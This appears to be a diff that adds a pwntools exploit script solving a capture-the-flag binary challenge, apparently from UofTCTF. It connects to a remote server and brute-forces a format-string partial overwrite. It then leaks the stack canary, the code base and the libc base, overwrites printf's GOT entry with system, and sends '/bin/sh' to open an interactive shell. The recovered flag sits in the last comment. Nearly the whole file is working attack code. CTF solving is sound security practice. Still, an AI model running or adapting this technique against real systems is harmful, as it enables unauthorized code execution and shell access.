@@ -1,0 +1,66 @@
+from pwn import *
+
+e = ELF("./chall_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-2.39.so")
+
+script = '''
+b *vuln + 44
+'''
+
+
+while(True):
+    p = remote("34.29.214.123", 5000)
+    #p = gdb.debug("./chall", gdbscript = script)
+    #p = process("./chall_patched")
+    
+    payload = f"%{0x81f4}c%9$hn".encode()
+    payload = payload.ljust(0x11, b"A")
+    payload += p16(0xb018)
+    p.send(payload)
+        
+    try:
+        p.recvuntil(b"A" * 5)
+        p.send(b"vani5hing\x00")
+        p.recvuntil(b"vani5hing")
+        break
+    except:
+        try:
+            p.close()
+        except:
+            pass
+    
+
+#gdb.attach(p, gdbscript = script)
+p.send(b"%39$p\n%9$p\n\x00")
+canary = int(p.recvline()[:-1:], 16)
+code_base = int(p.recvline()[:-1:], 16) - 0x1247
+print(hex(canary))
+print(hex(code_base))
+printf_got = code_base + e.got['printf']
+
+p.send(b"%25$p\n\x00")
+libc_base = int(p.recvline()[:-1:], 16) - 0x2a1ca
+sys = system = libc_base + libc.symbols['system']
+print(hex(libc_base))
+
+l = []
+l.append([sys & 0xffff, 0])
+sys = sys >> 16
+l.append([sys & 0xffff, 2])
+sys = sys >> 16
+l.append([sys & 0xffff, 4])
+l = sorted(l, key = lambda x: x[0])
+
+payload  = f'%{l[0][0]}c%14$hn'.encode()
+payload += f'%{l[1][0] - l[0][0]}c%15$hn'.encode()
+payload += f'%{l[2][0] - l[1][0]}c%16$hn'.encode()
+payload = payload.ljust(0x39, b'A') + p64(printf_got + l[0][1]) + p64(printf_got + l[1][1]) + p64(printf_got + l[2][1])
+
+p.send(payload)
+
+p.recvuntil(b"A")
+p.send(b"/bin/sh\x00")
+
+p.interactive()
+#uoftctf{c4n4ry_15_u53l355_1f_607_15_wr174bl3}
